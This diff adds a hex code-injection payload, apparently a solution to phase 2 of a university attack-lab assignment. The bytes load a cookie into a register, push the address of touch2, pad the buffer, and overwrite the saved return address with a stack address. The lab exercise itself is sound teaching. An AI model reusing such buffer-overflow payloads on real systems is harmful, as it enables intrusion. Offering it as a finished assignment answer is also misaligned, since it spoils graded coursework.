@@ -1,0 +1,8 @@
+48 c7 c7 fa 97 b9 59		/* mov $0x59b997fa, %rdi - add cookie as argument for touch2	*/
+68 ec 17 40 00	 		/* pushq 0x4017ec - point the stack pointer to touch2	  	*/
+c3				/* retq 			*/
+00 00 00 			/* fill 0x5561dc85 to ..dc87	*/
+00 00 00 00 00 00 00 00		/* fill 0x5561dc88 to ..dc8f	*/
+00 00 00 00 00 00 00 00		/* fill 0x5561dc90 to ..dc97	*/
+00 00 00 00 00 00 00 00		/* fill 0x5561dc98 to ..dc9f	*/
+78 dc 61 55 00 00 00 00		/* update return add of test() with start of my worm	*/
